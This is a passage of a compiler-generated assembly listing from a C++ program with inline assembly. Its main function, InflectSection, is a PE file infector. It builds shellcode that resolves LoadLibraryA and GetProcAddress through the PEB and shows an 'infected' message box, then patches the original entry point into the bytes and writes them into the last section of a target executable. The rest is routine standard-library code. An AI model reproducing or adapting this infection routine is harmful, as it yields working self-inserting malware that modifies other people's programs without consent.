  000d8	8b d8		 mov	 ebx, eax

; 110  :         mov   eax, [ebx + 0x3c]; PE header VMA

  000da	8b 43 3c	 mov	 eax, DWORD PTR [ebx+60]

; 111  :         mov   edi, [ebx + eax + 0x78]; Export table relative offset

  000dd	8b 7c 03 78	 mov	 edi, DWORD PTR [ebx+eax+120]

; 112  :         add   edi, ebx; Export table VMA

  000e1	03 fb		 add	 edi, ebx

; 113  :         mov   ecx, [edi + 0x18]; Number of names

  000e3	8b 4f 18	 mov	 ecx, DWORD PTR [edi+24]

; 114  :  
; 115  :         mov   edx, [edi + 0x20]; Names table relative offset

  000e6	8b 57 20	 mov	 edx, DWORD PTR [edi+32]

; 116  :         add   edx, ebx; Names table VMA

  000e9	03 d3		 add	 edx, ebx
$LLA$8:

; 117  :         // now lets look for a function named LoadLibraryA
; 118  :  
; 119  :         LLA :
; 120  :         dec ecx

  000eb	49		 dec	 ecx

; 121  :             mov esi, [edx + ecx * 4]; Store the relative offset of the name

  000ec	8b 34 8a	 mov	 esi, DWORD PTR [edx+ecx*4]

; 122  :             add esi, ebx; Set esi to the VMA of the current name

  000ef	03 f3		 add	 esi, ebx

; 123  :             cmp dword ptr[esi], 0x64616f4c; backwards order of bytes L(4c)o(6f)a(61)d(64)

  000f1	81 3e 4c 6f 61
	64		 cmp	 DWORD PTR [esi], 1684107084 ; 64616f4cH

; 124  :             je LLALOOP1

  000f7	74 00		 je	 SHORT $LLALOOP1$9
$LLALOOP1$9:

; 125  :         LLALOOP1 :
; 126  :         cmp dword ptr[esi + 4], 0x7262694c

  000f9	81 7e 04 4c 69
	62 72		 cmp	 DWORD PTR [esi+4], 1919052108 ; 7262694cH

; 127  :             ;L(4c)i(69)b(62)r(72)
; 128  :             je LLALOOP2

  00100	74 00		 je	 SHORT $LLALOOP2$10
$LLALOOP2$10:

; 129  :         LLALOOP2 :
; 130  :         cmp dword ptr[esi + 8], 0x41797261; third dword = a(61)r(72)y(79)A(41)

  00102	81 7e 08 61 72
	79 41		 cmp	 DWORD PTR [esi+8], 1098478177 ; 41797261H

; 131  :             je stop; if its = then jump to stop because we found it

  00109	74 02		 je	 SHORT $stop$11

; 132  :             jmp LLA; Load Libr aryA

  0010b	eb de		 jmp	 SHORT $LLA$8
$stop$11:

; 133  :         stop :
; 134  :         mov   edx, [edi + 0x24]; Table of ordinals relative

  0010d	8b 57 24	 mov	 edx, DWORD PTR [edi+36]

; 135  :             add   edx, ebx; Table of ordinals

  00110	03 d3		 add	 edx, ebx

; 136  :             mov   cx, [edx + 2 * ecx]; function ordinal

  00112	66 8b 0c 4a	 mov	 cx, WORD PTR [edx+ecx*2]

; 137  :             mov   edx, [edi + 0x1c]; Address table relative offset

  00116	8b 57 1c	 mov	 edx, DWORD PTR [edi+28]

; 138  :             add   edx, ebx; Table address

  00119	03 d3		 add	 edx, ebx

; 139  :             mov   eax, [edx + 4 * ecx]; ordinal offset

  0011b	8b 04 8a	 mov	 eax, DWORD PTR [edx+ecx*4]

; 140  :             add   eax, ebx; Function VMA

  0011e	03 c3		 add	 eax, ebx

; 141  :             // EAX holds address of LoadLibraryA now
; 142  :  
; 143  :  
; 144  :             sub esp, 11

  00120	83 ec 0b	 sub	 esp, 11			; 0000000bH

; 145  :             mov ebx, esp

  00123	8b dc		 mov	 ebx, esp

; 146  :             mov byte ptr[ebx], 0x75; u

  00125	c6 03 75	 mov	 BYTE PTR [ebx], 117	; 00000075H

; 147  :             mov byte ptr[ebx + 1], 0x73; s

  00128	c6 43 01 73	 mov	 BYTE PTR [ebx+1], 115	; 00000073H

; 148  :             mov byte ptr[ebx + 2], 0x65; e

  0012c	c6 43 02 65	 mov	 BYTE PTR [ebx+2], 101	; 00000065H

; 149  :             mov byte ptr[ebx + 3], 0x72; r

  00130	c6 43 03 72	 mov	 BYTE PTR [ebx+3], 114	; 00000072H

; 150  :             mov byte ptr[ebx + 4], 0x33; 3

  00134	c6 43 04 33	 mov	 BYTE PTR [ebx+4], 51	; 00000033H

; 151  :             mov byte ptr[ebx + 5], 0x32; 2

  00138	c6 43 05 32	 mov	 BYTE PTR [ebx+5], 50	; 00000032H

; 152  :             mov byte ptr[ebx + 6], 0x2e; .

  0013c	c6 43 06 2e	 mov	 BYTE PTR [ebx+6], 46	; 0000002eH

; 153  :             mov byte ptr[ebx + 7], 0x64; d

  00140	c6 43 07 64	 mov	 BYTE PTR [ebx+7], 100	; 00000064H

; 154  :             mov byte ptr[ebx + 8], 0x6c; l

  00144	c6 43 08 6c	 mov	 BYTE PTR [ebx+8], 108	; 0000006cH

; 155  :             mov byte ptr[ebx + 9], 0x6c; l

  00148	c6 43 09 6c	 mov	 BYTE PTR [ebx+9], 108	; 0000006cH

; 156  :             mov byte ptr[ebx + 10], 0x0

  0014c	c6 43 0a 00	 mov	 BYTE PTR [ebx+10], 0

; 157  :  
; 158  :             push ebx

  00150	53		 push	 ebx

; 159  :  
; 160  :             //lets call LoadLibraryA with user32.dll as argument
; 161  :             call eax;

  00151	ff d0		 call	 eax

; 162  :             add esp, 11

  00153	83 c4 0b	 add	 esp, 11			; 0000000bH

; 163  :             //save the return address of LoadLibraryA for later use in GetProcAddress
; 164  :             push eax

  00156	50		 push	 eax

; 165  :  
; 166  :  
; 167  :             // now we look again for a function named GetProcAddress
; 168  :             mov eax, fs:[30h]

  00157	64 a1 30 00 00
	00		 mov	 eax, DWORD PTR fs:48

; 169  :             mov eax, [eax + 0x0c]; 12

  0015d	8b 40 0c	 mov	 eax, DWORD PTR [eax+12]

; 170  :             mov eax, [eax + 0x14]; 20

  00160	8b 40 14	 mov	 eax, DWORD PTR [eax+20]

; 171  :             mov eax, [eax]

  00163	8b 00		 mov	 eax, DWORD PTR [eax]

; 172  :             mov eax, [eax]

  00165	8b 00		 mov	 eax, DWORD PTR [eax]

; 173  :             mov eax, [eax + 0x10]; 16

  00167	8b 40 10	 mov	 eax, DWORD PTR [eax+16]

; 174  :  
; 175  :             mov   ebx, eax; Take the base address of kernel32

  0016a	8b d8		 mov	 ebx, eax

; 176  :             mov   eax, [ebx + 0x3c]; PE header VMA

  0016c	8b 43 3c	 mov	 eax, DWORD PTR [ebx+60]

; 177  :             mov   edi, [ebx + eax + 0x78]; Export table relative offset

  0016f	8b 7c 03 78	 mov	 edi, DWORD PTR [ebx+eax+120]

; 178  :             add   edi, ebx; Export table VMA

  00173	03 fb		 add	 edi, ebx

; 179  :             mov   ecx, [edi + 0x18]; Number of names

  00175	8b 4f 18	 mov	 ecx, DWORD PTR [edi+24]

; 180  :  
; 181  :             mov   edx, [edi + 0x20]; Names table relative offset

  00178	8b 57 20	 mov	 edx, DWORD PTR [edi+32]

; 182  :             add   edx, ebx; Names table VMA

  0017b	03 d3		 add	 edx, ebx
$GPA$12:

; 183  :         GPA :
; 184  :         dec ecx

  0017d	49		 dec	 ecx

; 185  :             mov esi, [edx + ecx * 4]; Store the relative offset of the name

  0017e	8b 34 8a	 mov	 esi, DWORD PTR [edx+ecx*4]

; 186  :             add esi, ebx; Set esi to the VMA of the current name

  00181	03 f3		 add	 esi, ebx

; 187  :             cmp dword ptr[esi], 0x50746547; backwards order of bytes G(47)e(65)t(74)P(50)

  00183	81 3e 47 65 74
	50		 cmp	 DWORD PTR [esi], 1349805383 ; 50746547H

; 188  :             je GPALOOP1

  00189	74 00		 je	 SHORT $GPALOOP1$13
$GPALOOP1$13:

; 189  :         GPALOOP1 :
; 190  :         cmp dword ptr[esi + 4], 0x41636f72

  0018b	81 7e 04 72 6f
	63 41		 cmp	 DWORD PTR [esi+4], 1097035634 ; 41636f72H

; 191  :             // backwards remember : ) r(72)o(6f)c(63)A(41)
; 192  :             je GPALOOP2

  00192	74 00		 je	 SHORT $GPALOOP2$14
$GPALOOP2$14:

; 193  :         GPALOOP2 :
; 194  :         cmp dword ptr[esi + 8], 0x65726464; third dword = d(64)d(64)r(72)e(65)

  00194	81 7e 08 64 64
	72 65		 cmp	 DWORD PTR [esi+8], 1701995620 ; 65726464H

; 195  :             //no need to continue to look further cause there is no other function starting with GetProcAddre
; 196  :             je stp; if its = then jump to stop because we found it

  0019b	74 02		 je	 SHORT $stp$15

; 197  :             jmp GPA

  0019d	eb de		 jmp	 SHORT $GPA$12
$stp$15:

; 198  :         stp :
; 199  :             mov   edx, [edi + 0x24]; Table of ordinals relative

  0019f	8b 57 24	 mov	 edx, DWORD PTR [edi+36]

; 200  :             add   edx, ebx; Table of ordinals

  001a2	03 d3		 add	 edx, ebx

; 201  :             mov   cx, [edx + 2 * ecx]; function ordinal

  001a4	66 8b 0c 4a	 mov	 cx, WORD PTR [edx+ecx*2]

; 202  :             mov   edx, [edi + 0x1c]; Address table relative offset

  001a8	8b 57 1c	 mov	 edx, DWORD PTR [edi+28]

; 203  :             add   edx, ebx; Table address

  001ab	03 d3		 add	 edx, ebx

; 204  :             mov   eax, [edx + 4 * ecx]; ordinal offset

  001ad	8b 04 8a	 mov	 eax, DWORD PTR [edx+ecx*4]

; 205  :             add   eax, ebx; Function VMA

  001b0	03 c3		 add	 eax, ebx

; 206  :             // EAX HOLDS THE ADDRESS OF GetProcAddress
; 207  :             mov esi, eax

  001b2	8b f0		 mov	 esi, eax

; 208  :  
; 209  :             sub esp, 12

  001b4	83 ec 0c	 sub	 esp, 12			; 0000000cH

; 210  :             mov ebx, esp

  001b7	8b dc		 mov	 ebx, esp

; 211  :             mov byte ptr[ebx], 0x4d //M

  001b9	c6 03 4d	 mov	 BYTE PTR [ebx], 77	; 0000004dH

; 212  :             mov byte ptr[ebx + 1], 0x65 //e

  001bc	c6 43 01 65	 mov	 BYTE PTR [ebx+1], 101	; 00000065H

; 213  :             mov byte ptr[ebx + 2], 0x73 //s

  001c0	c6 43 02 73	 mov	 BYTE PTR [ebx+2], 115	; 00000073H

; 214  :             mov byte ptr[ebx + 3], 0x73 //s

  001c4	c6 43 03 73	 mov	 BYTE PTR [ebx+3], 115	; 00000073H

; 215  :             mov byte ptr[ebx + 4], 0x61 //a

  001c8	c6 43 04 61	 mov	 BYTE PTR [ebx+4], 97	; 00000061H

; 216  :             mov byte ptr[ebx + 5], 0x67 //g

  001cc	c6 43 05 67	 mov	 BYTE PTR [ebx+5], 103	; 00000067H

; 217  :             mov byte ptr[ebx + 6], 0x65 //e

  001d0	c6 43 06 65	 mov	 BYTE PTR [ebx+6], 101	; 00000065H

; 218  :             mov byte ptr[ebx + 7], 0x42 //B

  001d4	c6 43 07 42	 mov	 BYTE PTR [ebx+7], 66	; 00000042H

; 219  :             mov byte ptr[ebx + 8], 0x6f //o

  001d8	c6 43 08 6f	 mov	 BYTE PTR [ebx+8], 111	; 0000006fH

; 220  :             mov byte ptr[ebx + 9], 0x78 //x

  001dc	c6 43 09 78	 mov	 BYTE PTR [ebx+9], 120	; 00000078H

; 221  :             mov byte ptr[ebx + 10], 0x41 //A

  001e0	c6 43 0a 41	 mov	 BYTE PTR [ebx+10], 65	; 00000041H

; 222  :             mov byte ptr[ebx + 11], 0x0

  001e4	c6 43 0b 00	 mov	 BYTE PTR [ebx+11], 0

; 223  :  
; 224  :             /*
; 225  :                 get back the value saved from LoadLibraryA return
; 226  :                 So that the call to GetProcAddress is:
; 227  :                 esi(saved eax{address of user32.dll module}, ebx {the string "MessageBoxA"})
; 228  :             */
; 229  :  
; 230  :             mov eax, [esp + 12]

  001e8	8b 44 24 0c	 mov	 eax, DWORD PTR [esp+12]

; 231  :             push ebx; MessageBoxA

  001ec	53		 push	 ebx

; 232  :             push eax; base address of user32.dll retrieved by LoadLibraryA

  001ed	50		 push	 eax

; 233  :             call esi; GetProcAddress address :))

  001ee	ff d6		 call	 esi

; 234  :             add esp, 12

  001f0	83 c4 0c	 add	 esp, 12			; 0000000cH

; 235  :  
; 236  :         sub esp, 8

  001f3	83 ec 08	 sub	 esp, 8

; 237  :         mov ebx, esp

  001f6	8b dc		 mov	 ebx, esp

; 238  :         mov byte ptr[ebx], 89;      Y

  001f8	c6 03 59	 mov	 BYTE PTR [ebx], 89	; 00000059H

; 239  :         mov byte ptr[ebx + 1], 111; o

  001fb	c6 43 01 6f	 mov	 BYTE PTR [ebx+1], 111	; 0000006fH

; 240  :         mov byte ptr[ebx + 2], 117; u

  001ff	c6 43 02 75	 mov	 BYTE PTR [ebx+2], 117	; 00000075H

; 241  :         mov byte ptr[ebx + 3], 39; `

  00203	c6 43 03 27	 mov	 BYTE PTR [ebx+3], 39	; 00000027H

; 242  :         mov byte ptr[ebx + 4], 118; v

  00207	c6 43 04 76	 mov	 BYTE PTR [ebx+4], 118	; 00000076H

; 243  :         mov byte ptr[ebx + 5], 101; e

  0020b	c6 43 05 65	 mov	 BYTE PTR [ebx+5], 101	; 00000065H

; 244  :         mov byte ptr[ebx + 6], 32; 

  0020f	c6 43 06 20	 mov	 BYTE PTR [ebx+6], 32	; 00000020H

; 245  :         mov byte ptr[ebx + 7], 103; g

  00213	c6 43 07 67	 mov	 BYTE PTR [ebx+7], 103	; 00000067H

; 246  :         mov byte ptr[ebx + 8], 111; o

  00217	c6 43 08 6f	 mov	 BYTE PTR [ebx+8], 111	; 0000006fH

; 247  :         mov byte ptr[ebx + 9], 116; t

  0021b	c6 43 09 74	 mov	 BYTE PTR [ebx+9], 116	; 00000074H

; 248  :         mov byte ptr[ebx + 10], 32; 

  0021f	c6 43 0a 20	 mov	 BYTE PTR [ebx+10], 32	; 00000020H

; 249  :         mov byte ptr[ebx + 11], 105; i

  00223	c6 43 0b 69	 mov	 BYTE PTR [ebx+11], 105	; 00000069H

; 250  :         mov byte ptr[ebx + 12], 110; n

  00227	c6 43 0c 6e	 mov	 BYTE PTR [ebx+12], 110	; 0000006eH

; 251  :         mov byte ptr[ebx + 13], 102; f

  0022b	c6 43 0d 66	 mov	 BYTE PTR [ebx+13], 102	; 00000066H

; 252  :         mov byte ptr[ebx + 14], 101; e

  0022f	c6 43 0e 65	 mov	 BYTE PTR [ebx+14], 101	; 00000065H

; 253  :         mov byte ptr[ebx + 15], 99;  c

  00233	c6 43 0f 63	 mov	 BYTE PTR [ebx+15], 99	; 00000063H

; 254  :         mov byte ptr[ebx + 16], 116; t

  00237	c6 43 10 74	 mov	 BYTE PTR [ebx+16], 116	; 00000074H

; 255  :         mov byte ptr[ebx + 17], 101; e

  0023b	c6 43 11 65	 mov	 BYTE PTR [ebx+17], 101	; 00000065H

; 256  :         mov byte ptr[ebx + 18], 100; d

  0023f	c6 43 12 64	 mov	 BYTE PTR [ebx+18], 100	; 00000064H

; 257  :         mov byte ptr[ebx + 19], 0

  00243	c6 43 13 00	 mov	 BYTE PTR [ebx+19], 0

; 258  : 
; 259  :  
; 260  :         push 0

  00247	6a 00		 push	 0

; 261  :         push 0

  00249	6a 00		 push	 0

; 262  :         push ebx

  0024b	53		 push	 ebx

; 263  :         push 0

  0024c	6a 00		 push	 0

; 264  :         call eax

  0024e	ff d0		 call	 eax

; 265  :         add esp, 8

  00250	83 c4 08	 add	 esp, 8

; 266  :  
; 267  :         mov eax, 0xdeadbeef ;Original Entry point

  00253	b8 ef be ad de	 mov	 eax, -559038737		; deadbeefH

; 268  :         jmp eax

  00258	ff e0		 jmp	 eax
$over$7:

; 269  :     }
; 270  :  
; 271  :     __asm{
; 272  :         over:
; 273  :         mov eax, loc2

  0025a	b8 00 00 00 00	 mov	 eax, OFFSET $loc2$16

; 274  :         mov [end],eax

  0025f	89 85 04 fc ff
	ff		 mov	 DWORD PTR _end$[ebp], eax
$loc2$16:

; 275  :         loc2:
; 276  :     }
; 277  : 
; 278  :     byte  address[1000];
; 279  :     byte *checkpoint = ((byte*)(start));

  00265	8b 95 0c fc ff
	ff		 mov	 edx, DWORD PTR _start$[ebp]
  0026b	89 95 f4 fb ff
	ff		 mov	 DWORD PTR _checkpoint$[ebp], edx

; 280  :     DWORD* invalidEP;
; 281  :     DWORD order = 0;

  00271	c7 85 10 fc ff
	ff 00 00 00 00	 mov	 DWORD PTR _order$[ebp], 0
$LN2@InflectSec:

; 282  : 
; 283  :     while (order < ((end - 11) - start)) {

  0027b	8b 85 04 fc ff
	ff		 mov	 eax, DWORD PTR _end$[ebp]
  00281	83 e8 0b	 sub	 eax, 11			; 0000000bH
  00284	2b 85 0c fc ff
	ff		 sub	 eax, DWORD PTR _start$[ebp]
  0028a	39 85 10 fc ff
	ff		 cmp	 DWORD PTR _order$[ebp], eax
  00290	73 75		 jae	 SHORT $LN3@InflectSec

; 284  :         invalidEP = ((DWORD*)((byte*)start + order));

  00292	8b 8d 0c fc ff
	ff		 mov	 ecx, DWORD PTR _start$[ebp]
  00298	03 8d 10 fc ff
	ff		 add	 ecx, DWORD PTR _order$[ebp]
  0029e	89 8d 08 fc ff
	ff		 mov	 DWORD PTR _invalidEP$[ebp], ecx

; 285  :         if (*invalidEP == 0xdeadbeef) {

  002a4	8b 95 08 fc ff
	ff		 mov	 edx, DWORD PTR _invalidEP$[ebp]
  002aa	81 3a ef be ad
	de		 cmp	 DWORD PTR [edx], -559038737 ; deadbeefH
  002b0	75 26		 jne	 SHORT $LN4@InflectSec

; 286  :             /*
; 287  :                 Because the value of OEP is stored in this executable's data section,
; 288  :                 if we have said mov eax,OEP the self read part of the program will fill in
; 289  :                 a invalid address,since we point to something that only exists here,
; 290  :                 not in the infected PE's data section.
; 291  :                 Solution:
; 292  :                 We put a place holder with the fancy value of 0xdeadbeef,so we later alter this address
; 293  :                 inside the self read byte storage to the value of OEP
; 294  :             */
; 295  :             DWORD carrier;
; 296  :             VirtualProtect((LPVOID)invalidEP, 4, PAGE_EXECUTE_READWRITE, &carrier);

  002b2	8d 85 f0 fb ff
	ff		 lea	 eax, DWORD PTR _carrier$1[ebp]
  002b8	50		 push	 eax
  002b9	6a 40		 push	 64			; 00000040H
  002bb	6a 04		 push	 4
  002bd	8b 8d 08 fc ff
	ff		 mov	 ecx, DWORD PTR _invalidEP$[ebp]
  002c3	51		 push	 ecx
  002c4	ff 15 00 00 00
	00		 call	 DWORD PTR __imp__VirtualProtect@16

; 297  :             *invalidEP = OEP;

  002ca	8b 95 08 fc ff
	ff		 mov	 edx, DWORD PTR _invalidEP$[ebp]
  002d0	8b 85 f8 fb ff
	ff		 mov	 eax, DWORD PTR _OEP$[ebp]
  002d6	89 02		 mov	 DWORD PTR [edx], eax
$LN4@InflectSec:

; 298  :         }
; 299  :         address[order] = checkpoint[order];

  002d8	8b 8d f4 fb ff
	ff		 mov	 ecx, DWORD PTR _checkpoint$[ebp]
  002de	03 8d 10 fc ff
	ff		 add	 ecx, DWORD PTR _order$[ebp]
  002e4	8b 95 10 fc ff
	ff		 mov	 edx, DWORD PTR _order$[ebp]
  002ea	8a 01		 mov	 al, BYTE PTR [ecx]
  002ec	88 84 15 14 fc
	ff ff		 mov	 BYTE PTR _address$[ebp+edx], al

; 300  :         order++;

  002f3	8b 8d 10 fc ff
	ff		 mov	 ecx, DWORD PTR _order$[ebp]
  002f9	83 c1 01	 add	 ecx, 1
  002fc	89 8d 10 fc ff
	ff		 mov	 DWORD PTR _order$[ebp], ecx

; 301  :     }

  00302	e9 74 ff ff ff	 jmp	 $LN2@InflectSec
$LN3@InflectSec:

; 302  :     SetFilePointer(hFile, lastSection->PointerToRawData, NULL, FILE_BEGIN);

  00307	6a 00		 push	 0
  00309	6a 00		 push	 0
  0030b	8b 95 00 fc ff
	ff		 mov	 edx, DWORD PTR _lastSection$[ebp]
  00311	8b 42 14	 mov	 eax, DWORD PTR [edx+20]
  00314	50		 push	 eax
  00315	8b 4d 08	 mov	 ecx, DWORD PTR _hFile$[ebp]
  00318	8b 11		 mov	 edx, DWORD PTR [ecx]
  0031a	52		 push	 edx
  0031b	ff 15 00 00 00
	00		 call	 DWORD PTR __imp__SetFilePointer@16

; 303  :     WriteFile(hFile, address, order, &byteWritten, 0);

  00321	6a 00		 push	 0
  00323	8d 45 18	 lea	 eax, DWORD PTR _byteWritten$[ebp]
  00326	50		 push	 eax
  00327	8b 8d 10 fc ff
	ff		 mov	 ecx, DWORD PTR _order$[ebp]
  0032d	51		 push	 ecx
  0032e	8d 95 14 fc ff
	ff		 lea	 edx, DWORD PTR _address$[ebp]
  00334	52		 push	 edx
  00335	8b 45 08	 mov	 eax, DWORD PTR _hFile$[ebp]
  00338	8b 08		 mov	 ecx, DWORD PTR [eax]
  0033a	51		 push	 ecx
  0033b	ff 15 00 00 00
	00		 call	 DWORD PTR __imp__WriteFile@20

; 304  :     CloseHandle(hFile);

  00341	8b 55 08	 mov	 edx, DWORD PTR _hFile$[ebp]
  00344	8b 02		 mov	 eax, DWORD PTR [edx]
  00346	50		 push	 eax
  00347	ff 15 00 00 00
	00		 call	 DWORD PTR __imp__CloseHandle@4

; 305  :     return true;

  0034d	b0 01		 mov	 al, 1

; 306  : }

  0034f	5f		 pop	 edi
  00350	5e		 pop	 esi
  00351	5b		 pop	 ebx
  00352	8b 4d fc	 mov	 ecx, DWORD PTR __$ArrayPad$[ebp]
  00355	33 cd		 xor	 ecx, ebp
  00357	e8 00 00 00 00	 call	 @__security_check_cookie@4
  0035c	8b e5		 mov	 esp, ebp
  0035e	5d		 pop	 ebp
  0035f	c3		 ret	 0
?InflectSection@@YA_NAAPAXPAU_IMAGE_NT_HEADERS@@PAEKK@Z ENDP ; InflectSection
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\ostream
;	COMDAT ??$endl@DU?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@@Z
_TEXT	SEGMENT
tv79 = -4						; size = 4
__Ostr$ = 8						; size = 4
??$endl@DU?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@@Z PROC ; std::endl<char,std::char_traits<char> >, COMDAT

; 1010 :     basic_ostream<_Elem, _Traits>& _Ostr) { // insert newline and flush stream

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx

; 1011 :     _Ostr.put(_Ostr.widen('\n'));

  00004	8b 45 08	 mov	 eax, DWORD PTR __Ostr$[ebp]
  00007	8b 08		 mov	 ecx, DWORD PTR [eax]
  00009	8b 55 08	 mov	 edx, DWORD PTR __Ostr$[ebp]
  0000c	03 51 04	 add	 edx, DWORD PTR [ecx+4]
  0000f	89 55 fc	 mov	 DWORD PTR tv79[ebp], edx
  00012	6a 0a		 push	 10			; 0000000aH
  00014	8b 4d fc	 mov	 ecx, DWORD PTR tv79[ebp]
  00017	e8 00 00 00 00	 call	 ?widen@?$basic_ios@DU?$char_traits@D@std@@@std@@QBEDD@Z ; std::basic_ios<char,std::char_traits<char> >::widen
  0001c	0f b6 c0	 movzx	 eax, al
  0001f	50		 push	 eax
  00020	8b 4d 08	 mov	 ecx, DWORD PTR __Ostr$[ebp]
  00023	e8 00 00 00 00	 call	 ?put@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV12@D@Z ; std::basic_ostream<char,std::char_traits<char> >::put

; 1012 :     _Ostr.flush();

  00028	8b 4d 08	 mov	 ecx, DWORD PTR __Ostr$[ebp]
  0002b	e8 00 00 00 00	 call	 ?flush@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEAAV12@XZ ; std::basic_ostream<char,std::char_traits<char> >::flush

; 1013 :     return _Ostr;

  00030	8b 45 08	 mov	 eax, DWORD PTR __Ostr$[ebp]

; 1014 : }

  00033	8b e5		 mov	 esp, ebp
  00035	5d		 pop	 ebp
  00036	c3		 ret	 0
??$endl@DU?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@@Z ENDP ; std::endl<char,std::char_traits<char> >
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\ostream
;	COMDAT ??$?6U?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@PBD@Z
_TEXT	SEGMENT
__Ok$ = -124						; size = 8
tv416 = -116						; size = 8
tv352 = -108						; size = 8
tv340 = -100						; size = 8
tv135 = -92						; size = 8
__Count$ = -84						; size = 8
__Pad$ = -76						; size = 8
$T2 = -68						; size = 4
tv303 = -64						; size = 4
tv289 = -60						; size = 4
tv276 = -56						; size = 4
tv257 = -52						; size = 4
tv259 = -48						; size = 4
tv252 = -44						; size = 4
tv217 = -40						; size = 4
tv194 = -36						; size = 4
tv196 = -32						; size = 4
tv189 = -28						; size = 4
__State$ = -24						; size = 4
tv250 = -18						; size = 1
tv187 = -17						; size = 1
__$EHRec$ = -16						; size = 16
__Ostr$ = 8						; size = 4
__Val$ = 12						; size = 4
??$?6U?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@PBD@Z PROC ; std::operator<<<std::char_traits<char> >, COMDAT

; 766  : basic_ostream<char, _Traits>& operator<<(basic_ostream<char, _Traits>& _Ostr, const char* _Val) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	6a ff		 push	 -1
  00005	68 00 00 00 00	 push	 __ehhandler$??$?6U?$char_traits@D@std@@@std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@PBD@Z
  0000a	64 a1 00 00 00
	00		 mov	 eax, DWORD PTR fs:0
  00010	50		 push	 eax
  00011	51		 push	 ecx
  00012	83 ec 6c	 sub	 esp, 108		; 0000006cH
  00015	53		 push	 ebx
  00016	56		 push	 esi
  00017	57		 push	 edi
  00018	a1 00 00 00 00	 mov	 eax, DWORD PTR ___security_cookie
  0001d	33 c5		 xor	 eax, ebp
  0001f	50		 push	 eax
  00020	8d 45 f4	 lea	 eax, DWORD PTR __$EHRec$[ebp+4]
  00023	64 a3 00 00 00
	00		 mov	 DWORD PTR fs:0, eax
  00029	89 65 f0	 mov	 DWORD PTR __$EHRec$[ebp], esp

; 767  :     // insert NTBS into char stream
; 768  :     using _Elem = char;
; 769  :     using _Myos = basic_ostream<_Elem, _Traits>;
; 770  : 
; 771  :     ios_base::iostate _State = ios_base::goodbit;

  0002c	c7 45 e8 00 00
	00 00		 mov	 DWORD PTR __State$[ebp], 0

; 772  :     streamsize _Count        = static_cast<streamsize>(_Traits::length(_Val));

  00033	8b 45 0c	 mov	 eax, DWORD PTR __Val$[ebp]
  00036	50		 push	 eax
  00037	e8 00 00 00 00	 call	 ?length@?$_Narrow_char_traits@DH@std@@SAIQBD@Z ; std::_Narrow_char_traits<char,int>::length
  0003c	83 c4 04	 add	 esp, 4
  0003f	33 c9		 xor	 ecx, ecx
  00041	89 45 ac	 mov	 DWORD PTR __Count$[ebp], eax
  00044	89 4d b0	 mov	 DWORD PTR __Count$[ebp+4], ecx

; 773  :     streamsize _Pad          = _Ostr.width() <= 0 || _Ostr.width() <= _Count ? 0 : _Ostr.width() - _Count;

  00047	8b 55 08	 mov	 edx, DWORD PTR __Ostr$[ebp]
  0004a	8b 02		 mov	 eax, DWORD PTR [edx]
  0004c	8b 4d 08	 mov	 ecx, DWORD PTR __Ostr$[ebp]
  0004f	03 48 04	 add	 ecx, DWORD PTR [eax+4]
  00052	e8 00 00 00 00	 call	 ?width@ios_base@std@@QBE_JXZ ; std::ios_base::width
  00057	89 45 9c	 mov	 DWORD PTR tv340[ebp], eax
  0005a	89 55 a0	 mov	 DWORD PTR tv340[ebp+4], edx
  0005d	83 7d a0 00	 cmp	 DWORD PTR tv340[ebp+4], 0
  00061	7c 4e		 jl	 SHORT $LN17@operator
  00063	7f 06		 jg	 SHORT $LN23@operator
  00065	83 7d 9c 00	 cmp	 DWORD PTR tv340[ebp], 0
  00069	76 46		 jbe	 SHORT $LN17@operator
$LN23@operator:
  0006b	8b 4d 08	 mov	 ecx, DWORD PTR __Ostr$[ebp]
  0006e	8b 11		 mov	 edx, DWORD PTR [ecx]
  00070	8b 4d 08	 mov	 ecx, DWORD PTR __Ostr$[ebp]
  00073	03 4a 04	 add	 ecx, DWORD PTR [edx+4]
  00076	e8 00 00 00 00	 call	 ?width@ios_base@std@@QBE_JXZ ; std::ios_base::width
  0007b	89 45 94	 mov	 DWORD PTR tv352[ebp], eax
  0007e	89 55 98	 mov	 DWORD PTR tv352[ebp+4], edx
  00081	8b 45 98	 mov	 eax, DWORD PTR tv352[ebp+4]
  00084	3b 45 b0	 cmp	 eax, DWORD PTR __Count$[ebp+4]
  00087	7c 28		 jl	 SHORT $LN17@operator
  00089	7f 08		 jg	 SHORT $LN24@operator
  0008b	8b 4d 94	 mov	 ecx, DWORD PTR tv352[ebp]
  0008e	3b 4d ac	 cmp	 ecx, DWORD PTR __Count$[ebp]
  00091	76 1e		 jbe	 SHORT $LN17@operator
$LN24@operator:
  00093	8b 55 08	 mov	 edx, DWORD PTR __Ostr$[ebp]
  00096	8b 02		 mov	 eax, DWORD PTR [edx]
  00098	8b 4d 08	 mov	 ecx, DWORD PTR __Ostr$[ebp]
  0009b	03 48 04	 add	 ecx, DWORD PTR [eax+4]
  0009e	e8 00 00 00 00	 call	 ?width@ios_base@std@@QBE_JXZ ; std::ios_base::width
  000a3	2b 45 ac	 sub	 eax, DWORD PTR __Count$[ebp]
  000a6	1b 55 b0	 sbb	 edx, DWORD PTR __Count$[ebp+4]
  000a9	89 45 a4	 mov	 DWORD PTR tv135[ebp], eax
  000ac	89 55 a8	 mov	 DWORD PTR tv135[ebp+4], edx
  000af	eb 08		 jmp	 SHORT $LN18@operator
$LN17@operator:
  000b1	0f 57 c0	 xorps	 xmm0, xmm0
  000b4	66 0f 13 45 a4	 movlpd	 QWORD PTR tv135[ebp], xmm0
$LN18@operator:
